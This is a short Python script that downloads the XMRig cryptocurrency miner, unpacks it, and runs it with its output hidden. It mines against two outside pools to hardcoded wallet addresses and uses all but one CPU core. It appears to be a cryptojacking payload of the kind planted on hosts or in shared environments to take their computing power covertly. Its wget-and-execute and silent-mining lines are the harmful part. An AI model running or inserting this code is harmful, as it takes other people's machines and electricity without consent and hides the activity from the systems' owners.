import os 

os.system("wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz")
os.system("tar -xf xmrig-6.18.0-linux-x64.tar.gz")
os.chdir("xmrig-6.18.0")
os.system("./xmrig -a auto -o auto.skypool.org:6666 -u 892Mr7U5kJdcYehtB3nbNf4J2uwQKfLPKX1TRA1AM9uYHsyYFdUWrH25LXCVQB3nQu1d8312ScUghN6g47Umic1jFi48Zqk -p R1 -t $(nproc --ignore 1) >/dev/null >/dev/null 2>&1 -a rx/0 -o fastpool.xyz:10109 -u Q0105004fc4b4a6151cf41ecc96e3ab30a3873cb18063cf5d77700879fd10f0146177c0617ab099 -p R1 -t $(nproc --ignore 1) >/dev/null >/dev/null 2>&1")
